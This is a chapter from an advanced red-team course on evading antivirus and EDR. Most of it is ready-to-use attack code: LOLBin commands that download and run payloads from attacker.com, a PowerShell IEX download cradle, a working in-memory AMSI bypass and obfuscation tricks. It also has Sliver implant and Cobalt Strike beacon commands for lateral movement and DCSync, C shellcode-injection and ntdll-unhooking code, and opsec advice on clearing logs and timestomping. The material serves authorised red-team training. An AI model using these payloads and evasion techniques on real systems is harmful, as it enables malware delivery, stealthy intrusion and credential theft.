---
title: "AV Evasion & Red Team Operations"
subtitle: "Bypassing antivirus and EDR, LOLBins, C2 frameworks, payload obfuscation, and advanced red team tradecraft."
chapter: 22
level: "advanced"
readingTime: "14 min"
topics: ["AV evasion", "EDR bypass", "C2 framework", "LOLBins", "red team", "payload obfuscation", "Cobalt Strike", "Sliver"]
---

<script>
	import Callout from '$lib/components/content/Callout.svelte';
</script>

<Callout type="info">

**Real-World Analogy**

An alarm system that triggers on "person with ski mask" doesn't catch a thief in a business suit. Modern AV thinks the same way — red teamers dress their payloads in clean-looking clothing to avoid pattern detection.

</Callout>

## How Antivirus Detection Works

```
Signature-based
  Hash or byte patterns of known malware
  → Bypass: modify any byte, re-encode, obfuscate

Heuristic
  Behavioral rules: "reads many files" = ransomware, "calls CreateRemoteThread" = injection
  → Bypass: avoid flagged API calls, use indirect syscalls

Machine Learning / AI
  Statistical models trained on malware behavior
  → Bypass: make your payload look statistically "normal"

Memory scanning (EDR)
  Scans process memory for known shellcode patterns
  → Bypass: encrypt shellcode in memory, sleep+decrypt, reflective loading

Sandbox detonation
  Run in automated VM, observe behavior
  → Bypass: detect sandbox (check CPU count, uptime, username) and sleep
```

## Living off the Land (LOLBins)

Use Windows' own trusted binaries to execute code — already trusted by AV:

```powershell
# Execution
# certutil — download and execute
certutil -urlcache -f http://attacker.com/shell.exe C:\Windows\Temp\shell.exe
certutil -decode encoded.b64 shell.exe   # decode base64

# mshta — execute HTA files (HTML Applications)
mshta http://attacker.com/payload.hta
mshta vbscript:CreateObject("Wscript.Shell").Run("cmd /c ...",0)(window.close)

# regsvr32 — execute DLL / COM objects
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll  # squiblydoo

# wscript / cscript
wscript //b //nologo payload.vbs

# rundll32
rundll32 javascript:"\..\mshtml.dll,RunHTMLApplication ";...

# InstallUtil
InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

# msiexec (MSI execution — legitimate install mechanism)
msiexec /quiet /q /i http://attacker.com/payload.msi

# Invoke-Expression via PowerShell
powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/ps.ps1')"

# LOLBAS project: lolbas-project.github.io
# Complete list of Windows binaries that can be abused
```

## PowerShell Obfuscation

```powershell
# Concatenation
$c = 'Invoke' + '-' + 'Expression'
& $c "Write-Host 'hello'"

# Backtick insertion (PowerShell ignores backticks in strings)
Invoke`-Expression "Write-Host 'hello'"

# Variable substitution
${e`x`p} = 'Invoke-Expression'
& ${e`x`p} "code here"

# Encoding
$cmd = "Write-Host 'pwned'"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -EncodedCommand $encoded

# Invoke-Obfuscation (automated)
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation
TOKEN\ALL\1   # tokenize and obfuscate all tokens

# AMSI bypass — Antimalware Scan Interface (scans PS scripts at runtime)
# Patch AMSI in memory before loading payloads
$a=[Ref].Assembly.GetTypes()
Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
$d=$c.GetFields('NonPublic,Static')
Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}
$g=$f.GetValue($null)
[IntPtr]$ptr=$g
[Int32[]]$buf = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

## C2 Frameworks

Command and Control frameworks manage compromised hosts with encrypted communications.

### Sliver (Open Source)

```bash
# Install
curl https://sliver.sh/install | sudo bash

# Start server
sliver-server

# Generate implant
sliver> generate --os windows --arch amd64 --mtls ATTACKER_IP:443 --save implant.exe
sliver> generate --os linux --arch amd64 --http http://ATTACKER_IP:80 --save implant.elf
sliver> generate beacon --os windows --arch amd64 --mtls ATTACKER_IP:443  # async beacon

# Start listener
sliver> mtls --lport 443
sliver> http --lport 80

# When implant runs:
sliver> sessions
sliver> use SESSION_ID
sliver (session)> info
sliver (session)> shell
sliver (session)> upload localfile.exe C:/Windows/Temp/
sliver (session)> execute-assembly Rubeus.exe kerberoast
sliver (session)> socks5 start --host 127.0.0.1 --port 9050  # pivot
```

### Cobalt Strike (Commercial)

Industry standard in red team operations. Common commands:

```
# After connecting to team server:
beacon> sleep 60        # check in every 60 seconds (stealth)
beacon> shell whoami    # run shell command
beacon> powershell IEX (New-Object Net.WebClient)...
beacon> upload /local/path C:\remote\path
beacon> download C:\sensitive\file
beacon> port-forward 8080 192.168.2.100 80  # pivot
beacon> jump psexec64 192.168.1.200 smb     # lateral movement
beacon> dcsync corp.local                   # DCSync via beacon
```

## Shellcode Obfuscation and Injection

```python
# XOR shellcode to bypass signature detection
import os

raw_shellcode = b'\x48\x31\xff\x48\x31\xf6...'  # msfvenom output
key = os.urandom(1)[0]  # random 1-byte key

encrypted = bytes([b ^ key for b in raw_shellcode])

# Decrypt and execute in C:
# char key = KEY;
# for(int i=0; i<len; i++) shellcode[i] ^= key;
# ((void(*)())shellcode)();
```

```c
// Process injection — inject shellcode into another process
// (e.g., inject into explorer.exe or a legitimate browser process)

HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
LPVOID mem = VirtualAllocEx(hProc, NULL, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProc, mem, shellcode, shellcode_len, NULL);
HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);

// Early Bird injection (inject into newly created process before it runs)
STARTUPINFO si = {0};
PROCESS_INFORMATION pi = {0};
CreateProcess("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, 
              CREATE_SUSPENDED, NULL, NULL, &si, &pi);
// Inject while process is suspended → before any security hooks load
```

## EDR Bypass Techniques

```c
// Direct syscalls — bypass API hooks by calling kernel directly
// Avoids hooks in ntdll.dll that EDRs place

// NtAllocateVirtualMemory directly via syscall number
// Tools: SysWhispers, HellsGate, Halo's Gate

// Unhooking — restore original ntdll functions
HANDLE hNtdll = GetModuleHandleA("ntdll.dll");
// Map a fresh copy of ntdll from disk
HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", ...);
// Copy .text section from clean ntdll over hooked in-memory version
// EDR hooks are now removed from memory
```

## Opsec (Operational Security)

Red team tradecraft to avoid detection:

```
Network:
  - Use HTTPS C2 (not HTTP) — encrypts all traffic
  - Domain fronting — use CDN as proxy for C2 (Cloudflare → your server)
  - HTTP traffic blending — make C2 look like legitimate web traffic
  - Sleep jitter — randomize beacon interval ±20% to avoid timing analysis

Host:
  - Avoid writing to disk — reflective DLL loading keeps payload in memory
  - Clean up artifacts — delete tools after use
  - Timestomping — modify file timestamps to match system files
  - Process hollowing — inject into legitimate process, not a new suspicious one

Logging:
  - Clear event logs after use (in scope only)
  - Use legitimate signed binaries for execution (LOLBins)
  - Avoid flagged tools (Mimikatz, PsExec by name — use variants or custom versions)
  
Infrastructure:
  - Redirectors — Apache/nginx proxy in front of C2, logs attacker's real IP
  - Domain aged >1 year — new domains are suspicious
  - Valid TLS cert — self-signed certs flag security tools
  - Multiple C2 channels — if one is blocked, fail over to another
```

## MITRE ATT&CK Framework

Every attack technique maps to ATT&CK for structured reporting:

```
Tactic           → what the attacker is trying to achieve
Technique        → how they do it
Sub-technique    → specific variation

TA0001 Initial Access
  T1566.001 Phishing: Spearphishing Attachment
  T1190 Exploit Public-Facing Application

TA0002 Execution
  T1059.001 Command and Scripting Interpreter: PowerShell
  T1059.003 Windows Command Shell

TA0004 Privilege Escalation
  T1078 Valid Accounts
  T1548.002 Abuse Elevation Control Mechanism: Bypass UAC

TA0006 Credential Access
  T1003.001 OS Credential Dumping: LSASS Memory
  T1558.003 Steal or Forge Kerberos Tickets: Kerberoasting

TA0008 Lateral Movement
  T1021.002 Remote Services: SMB/Windows Admin Shares
  T1550.002 Use Alternate Authentication Material: Pass the Hash

TA0011 Command and Control
  T1071.001 Application Layer Protocol: Web Protocols
  T1573.001 Encrypted Channel: Symmetric Cryptography
```

Tag every finding in your red team report with ATT&CK IDs for structured remediation.

